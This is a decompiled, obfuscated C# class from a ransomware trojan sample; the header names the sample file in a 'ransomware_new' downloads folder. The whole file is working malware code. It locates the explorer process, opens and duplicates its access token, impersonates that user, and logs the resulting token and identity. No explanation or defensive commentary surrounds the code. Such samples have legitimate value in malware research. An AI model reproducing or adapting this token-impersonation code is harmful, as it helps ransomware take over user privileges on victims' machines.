// Decompiled with JetBrains decompiler
// Type: coxZRmDhvSAWo.c00002c
// Assembly: Worker-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E50A6D0-CF23-40BF-9617-750EB84D00C0
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-122df846a943e419c3a31f65b6e67e7570134612b2dfd45638e0edd23e214036.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;

namespace coxZRmDhvSAWo
{
  internal sealed class c00002c
  {
    [NonSerialized]
    internal static GetString f000067;

    [SuppressUnmanagedCodeSecurity]
    [DllImport("advapi32", SetLastError = true)]
    private static extern int OpenProcessToken(IntPtr p0, int p1, ref IntPtr p2);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("kernel32", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr p0);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr p0, int p1, ref IntPtr p2);

    private static IntPtr LLoExEoeePHnHZ(IntPtr p0, int p1)
    {
      IntPtr zero = IntPtr.Zero;
      c00002c.DuplicateToken(p0, p1, ref zero);
      return zero;
    }

    public static void AQxYtYywpEIpR()
    {
      try
      {
        IntPtr zero1 = IntPtr.Zero;
        IntPtr zero2 = IntPtr.Zero;
        Process process1 = (Process) null;
        foreach (Process process2 in Process.GetProcesses())
        {
          if (process2.ProcessName == "explorer")
            process1 = process2;
        }
        if (c00002c.OpenProcessToken(process1.Handle, 14, ref zero1) == 0)
          return;
        WindowsIdentity windowsIdentity = new WindowsIdentity(zero1);
        if (GhAMvbuoccW.f000029)
        {
          try
          {
          }
          catch (Exception ex)
          {
          }
          try
          {
          }
          finally
          {
            c00002c.CloseHandle(zero1);
          }
        }
        IntPtr num = c00002c.LLoExEoeePHnHZ(zero1, 2);
        if (IntPtr.Zero == num)
          ;
        windowsIdentity.Impersonate();
        IntPtr token = WindowsIdentity.GetCurrent().Token;
        if (!GhAMvbuoccW.f000029)
          return;
        try
        {
          Console.WriteLine("Impersonation-> Token number: {0}", (object) token);
          Console.WriteLine("Impersonation-> Windows ID Name: {0}", (object) WindowsIdentity.GetCurrent().Name);
        }
        catch (Exception ex)
        {
        }
      }
      catch (Exception ex1)
      {
        if (!GhAMvbuoccW.CCDyMIHlAe)
          return;
        try
        {
          File.AppendAllText(GhAMvbuoccW.f000025, "Error while impersonating: " + ex1.Message);
        }
        catch (Exception ex2)
        {
        }
      }
    }

    static c00002c() => Strings.CreateGetStringDelegate(typeof (c00002c));
  }
}
